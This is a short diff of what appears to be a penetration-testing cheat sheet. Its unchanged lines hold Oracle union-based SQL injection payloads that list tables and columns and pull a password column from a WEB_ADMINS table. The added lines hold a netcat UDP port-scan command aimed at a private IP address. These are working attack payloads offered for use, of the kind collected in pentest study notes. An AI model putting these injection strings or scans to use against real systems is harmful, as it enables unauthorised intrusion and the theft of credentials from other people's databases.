@@ -177,3 +177,6 @@ Union based Oracle Sqli:
 ' or 1=1 union SELECT table_name,null,null FROM all_tables --
 ' or 1=1 union SELECT column_name,null,null FROM all_tab_columns WHERE table_name = 'tablename' --
 ' or 1=1 union SELECT null,password,null FROM WEB_ADMINS #display value of column password
+
+UDP Scanning Netcat:
+nc -zuv 10.11.1.226 1-100->port range
